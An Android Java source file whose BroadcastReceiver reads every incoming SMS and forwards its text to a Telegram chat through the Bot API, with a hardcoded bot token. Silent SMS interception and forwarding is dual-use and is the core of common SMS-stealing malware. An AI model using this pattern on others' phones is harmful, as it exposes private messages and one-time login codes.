package com.example.telegram_bot;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;


import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

public class SMSReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        Log.d(TAG, "reached");
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String message = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS message: " + message);
                    new TelegramSenderAsyncTask().execute(context, message);
                }
            }
        }
        Log.d("Naidu", "message received");
    }

    private static class TelegramSenderAsyncTask extends AsyncTask<Object, Void, Void> {
        @Override
        protected Void doInBackground(Object... params) {
            Context context = (Context) params[0];
            String msg = (String) params[1];
            Log.d(TAG, msg);
            String urlString = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s";

            String apiToken = "6054626631:AAHOgTguVmZHtbXpOhkahf965ZS2lBKkuJo";

            //Add chatId (given chatId is fake)
            String chatId = "-1001760717939";
            String text = msg;

            urlString = String.format(urlString, apiToken, chatId, text);

            try {
                URL url = new URL(urlString);
                URLConnection conn = url.openConnection();
                Log.d(TAG, "message is " + url);
                InputStream is = new BufferedInputStream(conn.getInputStream());
            } catch (IOException e) {
                e.printStackTrace();
            }
            return null;
        }
    }
}
